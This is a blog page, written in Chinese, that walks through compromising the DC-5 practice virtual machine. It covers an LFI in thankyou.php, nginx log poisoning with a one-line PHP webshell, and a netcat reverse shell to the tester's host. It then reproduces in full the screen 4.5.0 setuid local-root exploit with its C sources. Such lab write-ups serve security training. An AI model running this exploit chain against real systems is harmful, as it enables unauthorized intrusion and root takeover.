@@ -1,0 +1,136 @@
+<!DOCTYPE html><html lang="zh-cn"><head><meta charset="UTF-8"><meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no"><meta name="author" content="damn1t"><meta name="renderer" content="webkit"><meta name="copyright" content="damn1t"><meta name="keywords" content="damn1t"><meta name="description" content="404"><meta name="Cache-Control" content="no-cache"><meta http-equiv="X-UA-Compatible" content="IE=edge,chrome=1"><title>DC-5 · Damn1t's Blog</title><link rel="stylesheet" href="/css/style.css?v=2018.7.9"><link rel="stylesheet" href="/css/animation.css?v=2018.7.9"><link rel="icon" href="/img/assets/favicn.ico"><link rel="stylesheet" href="https://cdn.bootcss.com/font-awesome/4.7.0/css/font-awesome.min.css?version=1.5.6"><!-- scripts--><script>(function( w ){
+  "use strict";
+  // rel=preload support test
+  if( !w.loadCSS ){
+    w.loadCSS = function(){};
+  }
+  // define on the loadCSS obj
+  var rp = loadCSS.relpreload = {};
+  // rel=preload feature support test
+  // runs once and returns a function for compat purposes
+  rp.support = (function(){
+    var ret;
+    try {
+      ret = w.document.createElement( "link" ).relList.supports( "preload" );
+    } catch (e) {
+      ret = false;
+    }
+    return function(){
+      return ret;
+    };
+  })();
+
+  // if preload isn't supported, get an asynchronous load by using a non-matching media attribute
+  // then change that media back to its intended value on load
+  rp.bindMediaToggle = function( link ){
+    // remember existing media attr for ultimate state, or default to 'all'
+    var finalMedia = link.media || "all";
+
+    function enableStylesheet(){
+      link.media = finalMedia;
+    }
+
+    // bind load handlers to enable media
+    if( link.addEventListener ){
+      link.addEventListener( "load", enableStylesheet );
+    } else if( link.attachEvent ){
+      link.attachEvent( "onload", enableStylesheet );
+    }
+
+    // Set rel and non-applicable media type to start an async request
+    // note: timeout allows this to happen async to let rendering continue in IE
+    setTimeout(function(){
+      link.rel = "stylesheet";
+      link.media = "only x";
+    });
+    // also enable media after 3 seconds,
+    // which will catch very old browsers (android 2.x, old firefox) that don't support onload on link
+    setTimeout( enableStylesheet, 3000 );
+  };
+
+  // loop through link elements in DOM
+  rp.poly = function(){
+    // double check this to prevent external calls from running
+    if( rp.support() ){
+      return;
+    }
+    var links = w.document.getElementsByTagName( "link" );
+    for( var i = 0; i < links.length; i++ ){
+      var link = links[ i ];
+      // qualify links to those with rel=preload and as=style attrs
+      if( link.rel === "preload" && link.getAttribute( "as" ) === "style" && !link.getAttribute( "data-loadcss" ) ){
+        // prevent rerunning on link
+        link.setAttribute( "data-loadcss", true );
+        // bind listeners to toggle media back
+        rp.bindMediaToggle( link );
+      }
+    }
+  };
+
+  // if unsupported, run the polyfill
+  if( !rp.support() ){
+    // run once at least
+    rp.poly();
+
+    // rerun poly on an interval until onload
+    var run = w.setInterval( rp.poly, 500 );
+    if( w.addEventListener ){
+      w.addEventListener( "load", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    } else if( w.attachEvent ){
+      w.attachEvent( "onload", function(){
+        rp.poly();
+        w.clearInterval( run );
+      } );
+    }
+  }
+
+
+  // commonjs
+  if( typeof exports !== "undefined" ){
+    exports.loadCSS = loadCSS;
+  }
+  else {
+    w.loadCSS = loadCSS;
+  }
+}( typeof global !== "undefined" ? global : this ) );</script><script src="https://cdn.jsdelivr.net/npm/jquery@3.3.1/dist/jquery.min.js" defer></script><script src="/js/main.js?v=2018.7.9" defer></script><!-- fancybox--><link rel="preload" href="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.css" as="style" onload="this.onload=null;this.rel='stylesheet'"><script src="https://cdnjs.cloudflare.com/ajax/libs/fancybox/3.2.5/jquery.fancybox.min.js" defer></script><!-- busuanzi--><script async src="//dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script></head><body><section class="profile-close" id="cxo-profile"><div class="profile-avatar"><i class="fa fa-caret-left"></i><img src="/img/assets/logo.jpg"></div><!--.profile-saying
+  i.fa.fa-comment
+  .saying--><div class="cxo-profile-inner"><div class="profile-name">Damn1t</div><div class="profile-signature">for you I bleed myself dry</div><div class="friends"><div>FRIENDS</div><span><a href="//www.baidu.com" target="_black">baidu</a></span></div><div class="read-progress"></div></div></section><header id="cxo-intro" style="height: 70vh;background-image: url(/img/intro/index-bg.png);"><nav id="cxo-intro-nav"><section><div class="intro-nav-title"><a href="/">Damn1t's Blog</a></div><div class="intro-nav-label-box"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div><i class="fa fa-bars intro-nav-menu"><div class="intro-nav-drop"><a href="/">Home</a><a href="/about/">About</a><a href="/archives/">Archives</a><a href="/tags/">Tags</a></div></i><div class="clear"></div></section></nav><h1 class="post-title">DC-5</h1><div class="post-intros"><div class="post-intro-meta"><span class="post-intro-time"><i class="post-intro-calendar fa fa-calendar"></i><span>2020-02-12</span></span><span class="post-intro-tags"><a class="intro-tag fa fa-tag" href="javascript:void(0)" date-tags="靶机"> 靶机</a></span></div></div></header><article class="cxo-up" id="cxo-content-outer"><section id="cxo-content-inner"><article class="article-entry" id="post"><h2 id="获取shell"><a href="#获取shell" class="headerlink" title="获取shell"></a>获取shell</h2><p>老规矩，找ip和port：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">Nmap scan report <span class="keyword">for</span> dc-5 (192.168.43.192)</span><br><span class="line">Host is up (0.00030s latency).</span><br><span class="line"><span class="keyword">Not</span> shown: 998 closed ports</span><br><span class="line">PORT    STATE SERVICE</span><br><span class="line">80/tcp  open  http</span><br><span class="line">111/tcp open  rpcbind</span><br><span class="line">MAC Address: 08:00:27:FD:07:13 (Oracle VirtualBox virtual NIC)</span><br></pre></td></tr></table></figure></p>
+<p>指纹识别，不是常见的cms，架构是：<code>php+nginx</code></p>
+<p>扫描目录：<br><img src="https://i.loli.net/2020/02/12/KGDFivofcnxQNAZ.png" alt=""></p>
+<p>初看目录，感觉没什么特殊的，转而去找<code>rpcbind</code>的漏洞，结果好像不是，又回看目录，登入<code>footer.php</code><br><img src="https://i.loli.net/2020/02/12/WeEdj6IlS1fBtoR.png" alt=""><br>且每次刷新后，年份会变</p>
+<p>登录<code>thankyou.php</code><br><img src="https://i.loli.net/2020/02/12/bytxgDO4wEGIJlK.png" alt=""></p>
+<p>对比其他页面的copyright<br><img src="https://i.loli.net/2020/02/12/X8wIOzn3kDC1yFN.png" alt=""></p>
+<p>猜测<code>thankyou.php</code>是调用的：<code>file=footer.php</code></p>
+<p>那么就会有LFI,于是尝试读文件:<br><img src="https://i.loli.net/2020/02/12/bCMiJqrNdfu5VQm.png" alt=""><br>确实是这样</p>
+<p>进行信息收集，因为我们要写入shell</p>
+<p><strong>查看配置文件</strong></p>
+<p>去网上查了下nginx的配置文件默认路径，尝试发现确实没有修改，不断尝试，获得了如下的路径：<br><figure class="highlight stata"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">/etc/nginx/nginx.<span class="keyword">conf</span></span><br><span class="line"></span><br><span class="line">/<span class="keyword">var</span>/www/html/thankyou.p</span><br><span class="line"></span><br><span class="line">/etc/mysql/my.cnf</span><br><span class="line"></span><br><span class="line">access_log /<span class="keyword">var</span>/<span class="keyword">log</span>/nginx/access.<span class="keyword">log</span>;</span><br><span class="line">error_log /<span class="keyword">var</span>/<span class="keyword">log</span>/nginx/<span class="keyword">error</span>.<span class="keyword">log</span>;</span><br></pre></td></tr></table></figure></p>
+<p>这里很有意思的一点就是<strong>利用日志写入webshell</strong>，因为access和error的log都开启了，access会记录下每次的发送请求，error则会记录错误信息</p>
+<p>写入的方式有很多，参考如下两篇文章：<br><a href="https://www.ifobnn.com/lfiwithnginxlog.html" target="_blank" rel="noopener">https://www.ifobnn.com/lfiwithnginxlog.html</a><br><a href="https://www.jianshu.com/p/7aafed1db491" target="_blank" rel="noopener">https://www.jianshu.com/p/7aafed1db491</a></p>
+<p>我在<code>contact.php</code>下构造一句话木马，发送，之后检查的时候发现确实成功了：<br><img src="https://i.loli.net/2020/02/12/SeB5Ycmxr39bPnQ.png" alt=""></p>
+<p>(注：没注意到靶机服务器承受量有限，之前的目录扫描产生了过多的请求，从而access.log无法正常显示)</p>
+<p>执行命令，本地监听：<br><figure class="highlight dts"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">file=<span class="meta-keyword">/var/</span>log<span class="meta-keyword">/nginx/</span>access.log<span class="variable">&amp;cmd</span>=nc <span class="number">192.168</span><span class="number">.43</span><span class="number">.164</span> <span class="number">6666</span> -c <span class="meta-keyword">/bin/</span>bash</span><br></pre></td></tr></table></figure></p>
+<h2 id="提权"><a href="#提权" class="headerlink" title="提权"></a>提权</h2><p>先将其变为标准虚拟终端：<br><figure class="highlight swift"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python -<span class="built_in">c</span> '<span class="keyword">import</span> pty;pty.spawn("/bin/bash")'</span><br></pre></td></tr></table></figure></p>
+<p>切换到tmp目录下，下载脚本对Linux进行信息收集：<br><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget https:<span class="regexp">//</span>raw.githubusercontent.com<span class="regexp">/rebootuser/</span>LinEnum<span class="regexp">/master/</span>LinEnum.sh</span><br></pre></td></tr></table></figure></p>
+<p>注意到suid：<br><img src="https://i.loli.net/2020/02/12/TtqUiO52camrEhw.png" alt=""></p>
+<p>检索一番，发现<code>screen-4.5.0</code>是有漏洞的：<a href="https://www.exploit-db.com/exploits/41154" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/41154</a></p>
+<p>在本地将其脚本下载下来：<br><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/bin/bash</span></span><br><span class="line"><span class="comment"># screenroot.sh</span></span><br><span class="line"><span class="comment"># setuid screen v4.5.0 local root exploit</span></span><br><span class="line"><span class="comment"># abuses ld.so.preload overwriting to get root.</span></span><br><span class="line"><span class="comment"># <span class="doctag">bug:</span> https://lists.gnu.org/archive/html/screen-devel/2017-01/msg00025.html</span></span><br><span class="line"><span class="comment"># HACK THE PLANET</span></span><br><span class="line"><span class="comment"># ~ infodox (25/1/2017) </span></span><br><span class="line">echo <span class="string">"~ gnu/screenroot ~"</span></span><br><span class="line">echo <span class="string">"[+] First, we create our shell and library..."</span></span><br><span class="line">cat &lt;&lt; EOF &gt; /tmp/libhax.c</span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;sys/types.h&gt;</span></span><br><span class="line"><span class="comment">#include &lt;unistd.h&gt;</span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line">void dropshell(void)&#123;</span><br><span class="line">    chown(<span class="string">"/tmp/rootshell"</span>, 0, 0);</span><br><span class="line">    chmod(<span class="string">"/tmp/rootshell"</span>, 04755);</span><br><span class="line">    unlink(<span class="string">"/etc/ld.so.preload"</span>);</span><br><span class="line">    printf(<span class="string">"[+] done!\n"</span>);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c</span><br><span class="line">rm -f /tmp/libhax.c</span><br><span class="line">cat &lt;&lt; EOF &gt; /tmp/rootshell.c</span><br><span class="line"><span class="comment">#include &lt;stdio.h&gt;</span></span><br><span class="line">int main(void)&#123;</span><br><span class="line">    setuid(0);</span><br><span class="line">    setgid(0);</span><br><span class="line">    seteuid(0);</span><br><span class="line">    setegid(0);</span><br><span class="line">    execvp(<span class="string">"/bin/sh"</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br><span class="line">EOF</span><br><span class="line">gcc -o /tmp/rootshell /tmp/rootshell.c</span><br><span class="line">rm -f /tmp/rootshell.c</span><br><span class="line">echo <span class="string">"[+] Now we create our /etc/ld.so.preload file..."</span></span><br><span class="line">cd /etc</span><br><span class="line">umask 000 # because</span><br><span class="line">screen -D -m -L ld.so.preload echo -ne  <span class="string">"\x0a/tmp/libhax.so"</span> # newline needed</span><br><span class="line">echo <span class="string">"[+] Triggering..."</span></span><br><span class="line">screen -ls #<span class="built_in"> screen </span>itself is setuid, so<span class="built_in">..</span>. </span><br><span class="line">/tmp/rootshell</span><br></pre></td></tr></table></figure></p>
+<p>本地编译：</p>
+<ol>
+<li><p>复制第一段的c代码，改名为<code>libhax.c</code>，然后执行<code>gcc -fPIC -shared -ldl -o /tmp/libhax.so /tmp/libhax.c</code>：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;sys/types.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;unistd.h&gt;</span></span></span><br><span class="line">__attribute__ ((__constructor__))</span><br><span class="line"><span class="function"><span class="keyword">void</span> <span class="title">dropshell</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    chown(<span class="string">"/tmp/rootshell"</span>, <span class="number">0</span>, <span class="number">0</span>);</span><br><span class="line">    chmod(<span class="string">"/tmp/rootshell"</span>, <span class="number">04755</span>);</span><br><span class="line">    unlink(<span class="string">"/etc/ld.so.preload"</span>);</span><br><span class="line">    <span class="built_in">printf</span>(<span class="string">"[+] done!\n"</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>复制第二段的c代码，改名为<code>rootshell.c</code>,然后执行<code>gcc -o /tmp/rootshell /tmp/rootshell.c</code>：</p>
+<figure class="highlight cpp"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#<span class="meta-keyword">include</span> <span class="meta-string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="function"><span class="keyword">int</span> <span class="title">main</span><span class="params">(<span class="keyword">void</span>)</span></span>&#123;</span><br><span class="line">    setuid(<span class="number">0</span>);</span><br><span class="line">    setgid(<span class="number">0</span>);</span><br><span class="line">    seteuid(<span class="number">0</span>);</span><br><span class="line">    setegid(<span class="number">0</span>);</span><br><span class="line">    execvp(<span class="string">"/bin/sh"</span>, <span class="literal">NULL</span>, <span class="literal">NULL</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+</li>
+<li><p>将最后一段保存为<code>sh</code>脚本：</p>
+<figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">echo <span class="string">"[+] Now we create our /etc/ld.so.preload file..."</span></span><br><span class="line">cd /etc</span><br><span class="line">umask 000 # because</span><br><span class="line">screen -D -m -L ld.so.preload echo -ne  <span class="string">"\x0a/tmp/libhax.so"</span> # newline needed</span><br><span class="line">echo <span class="string">"[+] Triggering..."</span></span><br><span class="line">screen -ls #<span class="built_in"> screen </span>itself is setuid, so<span class="built_in">..</span>. </span><br><span class="line">/tmp/rootshell</span><br></pre></td></tr></table></figure>
+</li>
+</ol>
+<p>然后将生成的文件全部上传的靶机的tmp目录下，执行最后的sh脚本，直接执行会出错，因为 该sh开发作者是使用 Windows环境 开发，用vi打开该sh文件，使用 <code>:set ff=unix</code>保存，即可解决该问题</p>
+<p><img src="https://i.loli.net/2020/02/12/esZH5KGyQJpAS3I.png" alt=""></p>
+<p><img src="https://s2.ax1x.com/2020/02/12/1HYxSI.png" alt=""></p>
+</article><!-- lincense--><div class="license-wrapper"><p> <span>Author:  </span><a href="http://microvorld.com">damn1t</a></p><p> <span>Link:  </span><a href="http://microvorld.com/2020/02/12/靶机/DC-5/">http://microvorld.com/2020/02/12/靶机/DC-5/</a></p><p> <span>Copyright:  </span><span>All articles in this blog are licensed under <a rel="license" href="https://creativecommons.org/licenses/by-nc-nd/3.0">CC BY-NC-SA 3.0</a> unless stating additionally.</span></p></div><div class="post-paginator"><a class="nextSlogan" href="/2020/02/12/靶机/DC-4/" title="DC-4"><span>NextPost ></span><br><span class="nextTitle">DC-4</span></a><div class="clear"></div></div><div id="comment"></div></section></article><footer id="cxo-footer-outer"><div id="cxo-footer-inner"><p class="footer-container"><span>Site by </span><a href="http://hexo.io"><span>Hexo</span></a><span> | theme </span><a href="https://github.com/Longlongyu/hexo-theme-Cxo"><span>Cxo</span></a></p><i class="fa fa-user"> </i><span id="busuanzi_value_site_uv"></span><span> | </span><i class="fa fa-eye"> </i><span id="busuanzi_value_site_pv"></span></div></footer><!-- catelog--><div class="toc-wrapper" style="top: 70vh;"><div class="toc-catalog"><i class="fa fa-list"> </i><span>CATALOG</span></div><ol class="toc"><li class="toc-item toc-level-2"><a class="toc-link" href="#获取shell"><span class="toc-number">1.</span> <span class="toc-text">获取shell</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#提权"><span class="toc-number">2.</span> <span class="toc-text">提权</span></a></li></ol></div><!-- top--><i class="fa fa-arrow-up close" id="go-up" aria-hidden="true"></i></body></html>
